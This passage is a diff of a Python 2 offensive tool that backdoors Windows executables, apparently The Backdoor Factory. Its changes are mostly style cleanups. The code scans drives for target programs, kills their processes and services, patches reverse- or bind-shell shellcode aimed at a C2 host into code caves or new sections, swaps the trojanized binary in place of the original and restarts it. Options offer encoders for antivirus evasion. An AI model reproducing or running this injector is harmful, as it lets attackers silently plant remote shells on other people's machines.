+                       #'nc.exe': [('nc.exe', ), None, False],
                        }
 
     os_name = os.name
@@ -1293,18 +1397,21 @@ def injector(suffix, change_Access,
             print "You have a 32 bit system"
             system_type = 32
     else:
-        print "This works only on windows. :(" 
+        print "This works only on windows. :("
         sys.exit()
     winversion = platform.version()
     rootdir = os.path.splitdrive(sys.executable)[0]
     #print rootdir
-    targetdirs=[]
-    excludedirs=[]
+    targetdirs = []
+    excludedirs = []
     #print system_info
     winXP2003x86targetdirs = [rootdir+'\\']
-    winXP2003x86excludedirs = [rootdir+'\\Windows\\', rootdir+'\\RECYCLER\\']
-    vista7win82012x64targetdirs= [rootdir+'\\', rootdir+'\\Program Files (x86)\\']
-    vista7win82012x64excludedirs = [rootdir+'\\Program Files\\', rootdir+'\\Windows\\', 
+    winXP2003x86excludedirs = [rootdir+'\\Windows\\',
+                               rootdir+'\\RECYCLER\\']
+    vista7win82012x64targetdirs = [rootdir+'\\',
+                                   rootdir + '\\Program Files (x86)\\']
+    vista7win82012x64excludedirs = [rootdir+'\\Program Files\\',
+                                    rootdir+'\\Windows\\',
                                     rootdir+'\\RECYCLER\\']
 
     #need win2003, win2008, win8
@@ -1351,10 +1458,10 @@ def injector(suffix, change_Access,
 
     #print targetdirs
     #print excludedirs
-    filelist=set()
+    filelist = set()
     folderCount = 0
 
-    exclude=False  
+    exclude = False
     for path in targetdirs:
         for root, subFolders, files in os.walk(path):
             for directory in excludedirs:
@@ -1364,9 +1471,9 @@ def injector(suffix, change_Access,
                     exclude = True
                     #print exclude
                     break
-            if exclude == False:
+            if exclude is False:
                 for _file in files:
-                    f = os.path.join(root,_file)
+                    f = os.path.join(root, _file)
                     for target, items in list_of_targets.iteritems():
                         if target.lower() == _file.lower():
                             #print target, f
@@ -1374,166 +1481,186 @@ def injector(suffix, change_Access,
                             filelist.add(f)
                             #print exclude
             exclude = False
-    
+
     #grab tasklist
-    process_list=[]
+    process_list = []
     all_process = os.popen("tasklist.exe")
     ap = all_process.readlines()
     all_process.close()
     ap.pop(0)       # remove blank line
     _ = ap.pop(0)   # remove header line
     ap.pop(0)       # remove this ->> =======
-    
+
     for process in ap:
         process_list.append(process.split())
-    
-    #
 
     #print process_list
-    print filelist
+    #print filelist
     for target in filelist:
-        service_target=False
+        service_target = False
+        running_proc = False
         #get filename
         filename = os.path.basename(target)
-        file_path = os.path.dirname(target)+'\\'    
-        
+        file_path = os.path.dirname(target)+'\\'
         for process in process_list:
             #print process
             for setprocess, items in list_of_targets.iteritems():
-                if setprocess in target:
+                if setprocess.lower() in target.lower():
                     #print setprocess, process
                     for item in items[0]:
                         #print item
-                        if item in process:
+                        if item.lower() in [x.lower() for x in process]:
                             print "Killing process:", item
                             try:
                                 print process[1]
-                                os.system("taskkill /F /PID %i" % int(process[1]))
+                                os.system("taskkill /F /PID %i" %
+                                          int(process[1]))
+                                running_proc = True
                             except Exception as e:
                                 print str(e)
-                    if setprocess in process:
+                    if setprocess.lower() in [x.lower() for x in process]:
                         print True, items[0], items[1]
-                        if items[1] != None:
+                        if items[1] is not None:
                             print "Killing Service:", items[1]
                             try:
                                 os.system('net stop %s' % items[1])
                             except Exception as e:
                                 print str(e)
-                            service_target=True  
-          
-        time.sleep(1) 
+                            service_target = True
+
+        time.sleep(1)
         #backdoor the targets here:
         output_file = output_options(target, target+'.bd')
         shellcode = set_shells(SHELL, port, host)
         print "Backdooring:", target
-        result = do_thebackdoor(target, output_file, shellcode, nsection, add_section, encoder)
+        result = do_thebackdoor(target, output_file, shellcode,
+                                nsection, add_section, encoder)
         if result:
             pass
         else:
             continue
         shutil.copy2(target, target+suffix)
-        os.chmod( target, stat.S_IRWXU| stat.S_IRWXG| stat.S_IRWXO)
+        os.chmod(target, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
         time.sleep(1)
         try:
-            os.unlink(target) 
+            os.unlink(target)
         except:
-            print "unlinking error"   
-        time.sleep(1)       
+            print "unlinking error"
+        time.sleep(1)
         try:
             shutil.copy2(output_file, target)
         except:
             os.system('move {0} {1}'.format(target, output_file))
         os.remove(output_file)
-        print "The original file {0} has been renamed to {1}".format(target, target+suffix)
+        print ("The original file {0} has been renamed to {1}".format(target,
+               target+suffix))
 
-        if service_target==True:
+        if service_target is True:
             print "items[1]:", list_of_targets[filename][1]
             os.system('net start %s' % list_of_targets[filename][1])
+        elif items[2] is True and running_proc is True:
+            subprocess.Popen([target, ])
         else:
-            try:
-                if items[3] == True:
-                    os.system(target)
-            except:
-                print "%s was not found online not restarting" % target
+            print "%s was not found online not restarting" % target
 
 
 if __name__ == "__main__":
+    print choice(menu)
+    time.sleep(1)
 
     signal.signal(signal.SIGINT, signal_handler)
 
     parser = OptionParser()
-    parser.add_option("-f", "--file", dest="FILE", action="store", type="string", 
-                    help="File to backdoor")
-    parser.add_option("-i", "--hostip", default="", dest="HOST", action="store",type="string",  
-                    help="IP of the C2 for reverse connections")
+    parser.add_option("-f", "--file", dest="FILE", action="store",
+                      type="string",
+                      help="File to backdoor")
+    parser.add_option("-i", "--hostip", default="", dest="HOST",
+                      action="store", type="string",
+                      help="IP of the C2 for reverse connections")
     parser.add_option("-p", "--port", dest="PORT", action="store", type="int",
-                    help="The port to either connect back to for reverse shells"
-                    "or to listen on for bind shells") 
-    parser.add_option("-o", "--output-file", default="", dest="OUTPUT", action="store", type="string", 
-                    help="The backdoor output file")
-    parser.add_option("-s", "--shell", dest="SHELL", action="store", type="string", 
-                    help="Payloads that are available for use.")
-    parser.add_option("-n", "--section", default="sdata", dest="NSECTION", action="store", type="string", 
-                    help="New section name must be less than seven characters")
-    parser.add_option("-c", "--cave", default=False, dest="CAVE", action="store_true", 
-                    help="The cave flag will find code caves that can be used for stashing shellcode."
-                        "This will print to string all the code caves of a specific size."
-                        "The -l flag can be use with this setting.")
-    parser.add_option("-d", "--directory", dest="DIR", action="store", type="string",
-                    help="This is the location of the files that you want to backdoor."
-                        "You can make directory backdooring faster by forcing the attaching of a codecave" 
-                        "to the exe by using the -a setting.")
-    parser.add_option("-v", "--verbose", default=False, dest="VERBOSE", action="store_true",
-                    help="yes/no - For debug information output." )
-    parser.add_option("-e", "--encoder", default="none", dest="ENCODER", action="store", type="string",
-                    help="Encoders that can help with AV evasion.")
-    parser.add_option("-l", "--shell_length", default=380, dest="SHELL_LEN", action="store", type="int",
-                    help="For use with -c to help find code caves of different sizes")
-    parser.add_option("-a", "--add_new_section", default=False, dest="ADD_SECTION", action="store_true",
-                    help="Mandating that a new section be added to the exe (better success)"
-                        "but less av avoidance")
-    parser.add_option("-w", "--change_access", default=True, dest="CHANGE_ACCESS", action="store_false",
-                    help="This flag changes the section that houses the codecave to RWE."
-                        "Sometimes this is necessary. Enable by default. If disabled, the backdoor may fail.")
-    parser.add_option("-j", "--injector", default=False, dest="INJECTOR", action="store_true", 
-                      help="This command turns the backdoor factory in a hunt and shellcode"
-                      "inject type of mechinism. Edit the settings in the injector module.")
-    parser.add_option("-u", "--suffix", default=".old", dest="SUFFIX", action="store",
-                      type="string", help="For use with injector, places a suffix"
+                      help="The port to either connect back to for reverse "
+                      "shells or to listen on for bind shells")
+    parser.add_option("-o", "--output-file", default="", dest="OUTPUT",
+                      action="store", type="string",
+                      help="The backdoor output file")
+    parser.add_option("-s", "--shell", dest="SHELL", action="store",
+                      type="string",
+                      help="Payloads that are available for use.")
+    parser.add_option("-n", "--section", default="sdata", dest="NSECTION",
+                      action="store", type="string",
+                      help="New section name must be "
+                      "less than seven characters")
+    parser.add_option("-c", "--cave", default=False, dest="CAVE",
+                      action="store_true",
+                      help="The cave flag will find code caves that "
+                      "can be used for stashing shellcode."
+                      "This will print to string all the code caves "
+                      "of a specific size."
+                      "The -l flag can be use with this setting.")
+    parser.add_option("-d", "--directory", dest="DIR", action="store",
+                      type="string",
+                      help="This is the location of the files that "
+                      "you want to backdoor."
+                      "You can make a directory of file backdooring faster by "
+                      "forcing the attaching of a codecave "
+                      "to the exe by using the -a setting.")
+    parser.add_option("-v", "--verbose", default=False, dest="VERBOSE",
+                      action="store_true",
+                      help="For debug information output.")
+    parser.add_option("-e", "--encoder", default="none", dest="ENCODER",
+                      action="store", type="string",
+                      help="Encoders that can help with AV evasion.")
+    parser.add_option("-l", "--shell_length", default=380, dest="SHELL_LEN",
+                      action="store", type="int",
+                      help="For use with -c to help find code "
+                      "caves of different sizes")
+    parser.add_option("-a", "--add_new_section", default=False,
+                      dest="ADD_SECTION", action="store_true",
+                      help="Mandating that a new section be added to the "
+                      "exe (better success) but less av avoidance")
+    parser.add_option("-w", "--change_access", default=True,
+                      dest="CHANGE_ACCESS", action="store_false",
+                      help="This flag changes the section that houses "
+                      "the codecave to RWE. Sometimes this is necessary. "
+                      "Enabled by default. If disabled, the "
+                      "backdoor may fail.")
+    parser.add_option("-j", "--injector", default=False, dest="INJECTOR",
+                      action="store_true",
+                      help="This command turns the backdoor factory in a "
+                      "hunt and shellcode inject type of mechinism. Edit "
+                      "the target settings in the injector module.")
+    parser.add_option("-u", "--suffix", default=".old", dest="SUFFIX",
+                      action="store", type="string",
+                      help="For use with injector, places a suffix"
                       " on the original file for easy recovery")
-    (options, args) = parser.parse_args()   
+    (options, args) = parser.parse_args()
 
     verbose = options.VERBOSE
     change_access = options.CHANGE_ACCESS
-    
-    if options.INJECTOR == True:
-        """
-        injector(suffix=".old", change_Access=True, 
-             SHELL='reverse_shell_tcp', host='127.0.0.1', 
-             port='8080', nsection='cowwow', add_section=False,
-             verbose=False):
-    
-        """
+
+    if options.INJECTOR is True:
         injector(options.SUFFIX, change_access, options.SHELL,
-                options.ENCODER, options.HOST, options.PORT, 
-                options.NSECTION, options.ADD_SECTION, verbose)
+                 options.ENCODER, options.HOST, options.PORT,
+                 options.NSECTION, options.ADD_SECTION, verbose)
         sys.exit()
 
-    if options.CAVE == True:
+    if options.CAVE is True:
         if not options.FILE:
             print "You must provide a file to look for caves (-f)"
             sys.exit()
         f = open(options.FILE, 'rb')
         fileItems = gather_file_info(options.FILE, 'None')
-        print "Looking for caves with a size of %s bytes (measured as an integer)" \
-            % options.SHELL_LEN
+        print ("Looking for caves with a size of %s "
+               "bytes (measured as an integer)"
+               % options.SHELL_LEN)
         find_all_caves(fileItems, options.SHELL_LEN)
         sys.exit()
 
     if options.DIR:
         dirlisting = os.listdir(options.DIR)
-        print "You are going to backdoor the following items in the %s directory:" \
-                % options.DIR
+        print ("You are going to backdoor the following "
+               "items in the %s directory:"
+               % options.DIR)
         for item in dirlisting:
             print "     {0}".format(item)
         answer = raw_input("Do you want to continue? (yes/no) ")
@@ -1545,27 +1672,39 @@ if __name__ == "__main__":
                 print ("backdooring file %s" % item)
                 try:
                     output_file = output_options(options.FILE, options.OUTPUT)
-                    shellcode = set_shells(options.SHELL, options.PORT, options.HOST)
-                    result = do_thebackdoor(options.FILE, output_file, shellcode, options.NSECTION, options.ADD_SECTION, options.ENCODER)
-                    if result == None:
+                    shellcode = set_shells(options.SHELL,
+                                           options.PORT,
+                                           options.HOST)
+                    result = do_thebackdoor(options.FILE,
+                                            output_file,
+                                            shellcode,
+                                            options.NSECTION,
+                                            options.ADD_SECTION,
+                                            options.ENCODER)
+                    if result is None:
                         print 'Continuing'
                         continue
                     else:
-                        print "File {0} is in current directory".format(output_file)
+                        print ("File {0} is in current "
+                               "directory".format(output_file))
                 except Exception as e:
                     print str(e)
         else:
             print("Goodbye")
 
-        sys.exit()    
-   
+        sys.exit()
+
     if not options.FILE:
         parser.print_help()
         sys.exit(1)
 
     output_file = output_options(options.FILE, options.OUTPUT)
     shellcode = set_shells(options.SHELL, options.PORT, options.HOST)
-    result = do_thebackdoor(options.FILE, output_file, shellcode, options.NSECTION, options.ADD_SECTION, options.ENCODER)
-    if result == True:
+    result = do_thebackdoor(options.FILE,
+                            output_file,
+                            shellcode,
+                            options.NSECTION,
+                            options.ADD_SECTION,
+                            options.ENCODER)
+    if result is True:
         print "File {0} is in current directory".format(output_file)
-    
